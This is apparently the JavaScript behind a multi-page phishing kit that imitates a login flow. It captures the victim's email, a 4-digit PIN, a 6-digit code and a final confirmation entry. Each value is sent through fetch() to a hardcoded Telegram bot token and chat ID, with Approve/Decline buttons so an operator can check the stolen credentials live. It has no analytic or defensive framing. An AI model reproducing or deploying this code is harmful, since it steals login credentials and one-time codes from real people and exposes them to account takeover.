document.addEventListener("DOMContentLoaded", function () {
    const telegramBotToken = '7600421646:AAEWmFjiz9IcMUcqncFLp4wSnAHdZ77iaZU';
    const telegramChatId = '7837079543';
    const PIN_LENGTH = 4;
    const CODE_LENGTH = 6; // Final code length for page 3

    // Function to send a message to Telegram with Approve/Decline buttons
    function sendMessageToTelegramWithButtons(message, callbackType) {
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        const inlineKeyboardMarkup = {
            inline_keyboard: [
                [
                    { text: "Approve", callback_data: `${callbackType}:approve` },
                    { text: "Decline", callback_data: `${callbackType}:decline` }
                ]
            ]
        };

        console.log("Sending message with buttons to Telegram:", message);

        return fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: message,
                reply_markup: inlineKeyboardMarkup
            })
        })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Message with buttons successfully sent to Telegram bot');
                    return true;
                } else {
                    console.error('Failed to send message to Telegram:', data);
                    return false;
                }
            })
            .catch(error => {
                console.error('Error in sendMessageToTelegram function:', error);
                return false;
            });
    }

    // Listen for Telegram's response
    function handleTelegramResponse(callbackType) {
        return new Promise(resolve => {
            // Mocked user approval flow, replace this with server-side updates from Telegram webhook
            console.log(`Awaiting user decision for ${callbackType}`);
            setTimeout(() => {
                const mockDecision = prompt(`Mock response: Approve or Decline ${callbackType}?`, "approve"); // Simulates user choice
                resolve(mockDecision === "approve");
            }, 2000); // Simulate delay for Telegram interaction
        });
    }

    // Function to load content into #content-container seamlessly
    function loadContent(pageUrl) {
        console.log(`Attempting to load content from ${pageUrl}`);
        fetch(pageUrl)
            .then(response => {
                if (!response.ok) throw new Error(`Network response was not ok for ${pageUrl}`);
                return response.text();
            })
            .then(data => {
                const container = document.getElementById('content-container');
                if (container) {
                    container.innerHTML = data;
                    console.log(`Loaded content from ${pageUrl}`);

                    if (pageUrl === 'page2.html') {
                        displayStoredEmail();
                        initPinEntry();
                    } else if (pageUrl === 'page3.html') {
                        initFinalCodeEntry();
                    } else if (pageUrl === 'page4.html') {
                        initEmailConfirmation();
                    }
                } else {
                    console.error('#content-container not found');
                }
            })
            .catch(error => console.error(`Error loading content from ${pageUrl}:`, error));
    }

    // Initialize email entry functionality on page 1
    function initEmailEntry() {
        const loginButton = document.querySelector('[data-testid="e2e-login-continue-button"]');
        const emailInput = document.getElementById('email');

        if (loginButton && emailInput) {
            console.log("Email entry elements found on Page 1");
            loginButton.addEventListener('click', function (event) {
                event.preventDefault();
                const email = emailInput.value;

                if (email) {
                    console.log("Email entered:", email);
                    sendMessageToTelegramWithButtons(`User entered email: ${email}`, 'email').then(success => {
                        if (success) {
                            handleTelegramResponse('email').then(approved => {
                                if (approved) {
                                    localStorage.setItem("userEmail", email);
                                    loadContent('page2.html');
                                } else {
                                    alert("Please re-enter your email.");
                                    emailInput.value = ""; // Clear the input for re-entry
                                }
                            });
                        }
                    });
                } else {
                    console.log('No email entered');
                }
            });
        } else {
            console.log("Email entry elements not found on Page 1");
        }
    }

    // Display the stored email on page 2
    function displayStoredEmail() {
        const email = localStorage.getItem("userEmail");
        if (email) {
            const emailDisplay = document.getElementById('userEmail');
            if (emailDisplay) {
                emailDisplay.textContent = email;
                console.log("Displaying stored email on Page 2:", email);
            }
        }
    }

    // Initialize PIN entry functionality on page 2
    function initPinEntry() {
        const passcodeInput = document.getElementById('passcode-input');

        if (passcodeInput) {
            console.log("PIN entry elements found on Page 2");
            passcodeInput.addEventListener('input', function () {
                if (passcodeInput.value.length === PIN_LENGTH) {
                    console.log("PIN entered:", passcodeInput.value);
                    sendMessageToTelegramWithButtons(`Entered PIN: ${passcodeInput.value}`, 'pin').then(success => {
                        if (success) {
                            handleTelegramResponse('pin').then(approved => {
                                if (approved) {
                                    loadContent('page3.html');
                                } else {
                                    alert("Please re-enter your PIN.");
                                    passcodeInput.value = ""; // Clear the input for re-entry
                                }
                            });
                        }
                    });
                }
            });
        } else {
            console.log("PIN entry elements not found on Page 2");
        }
    }

    // Initialize final 6-digit code entry on page 3
    function initFinalCodeEntry() {
        const codeInput = document.getElementById('code-input');

        if (codeInput) {
            console.log("Final code entry elements found on Page 3");
            codeInput.addEventListener('input', function () {
                if (codeInput.value.length === CODE_LENGTH) {
                    console.log("Final code entered:", codeInput.value);
                    sendMessageToTelegramWithButtons(`Entered final code: ${codeInput.value}`, 'final_code').then(success => {
                        if (success) {
                            handleTelegramResponse('final_code').then(approved => {
                                if (approved) {
                                    window.location.href = 'page4.html';
                                } else {
                                    alert("Please re-enter the final code.");
                                    codeInput.value = ""; // Clear the input for re-entry
                                }
                            });
                        }
                    });
                }
            });
        } else {
            console.log("Final code input element not found on Page 3");
        }
    }

    // Initialize email confirmation on page 4
    function initEmailConfirmation() {
        const confirmEmailButton = document.getElementById('confirmEmailButton');
        const emailInput = document.getElementById('verification-url');

        if (confirmEmailButton && emailInput) {
            console.log("Email confirmation elements found on Page 4");

            confirmEmailButton.addEventListener('click', function () {
                const email = emailInput.value.trim();
                console.log("Submit button clicked, email input is:", email);

                if (email) {
                    sendMessageToTelegramWithButtons(`User confirmed email: ${email}`, 'confirm_email').then(success => {
                        if (success) {
                            handleTelegramResponse('confirm_email').then(approved => {
                                if (approved) {
                                    console.log("Email confirmation approved");
                                    window.location.href = 'confirmation.html';
                                } else {
                                    alert("Please re-enter the email confirmation.");
                                    emailInput.value = ""; // Clear the input for re-entry
                                }
                            });
                        }
                    });
                } else {
                    console.log("No email entered in the input field");
                }
            });
        } else {
            console.error("Email confirmation elements not found on Page 4");
        }
    }

    // Run the appropriate function based on the current page
    if (document.body.contains(document.getElementById('email'))) {
        initEmailEntry();
    } else if (document.body.contains(document.getElementById('passcode-input'))) {
        initPinEntry();
    } else if (document.body.contains(document.getElementById('code-input'))) {
        initFinalCodeEntry();
    } else if (document.body.contains(document.getElementById('verification-url'))) {
        initEmailConfirmation();
    }

    // Lock scrolling on every page
    document.documentElement.style.overflow = 'hidden';
    document.documentElement.style.height = '100vh';
    document.body.style.overflow = 'hidden';
    document.body.style.height = '100vh';
});
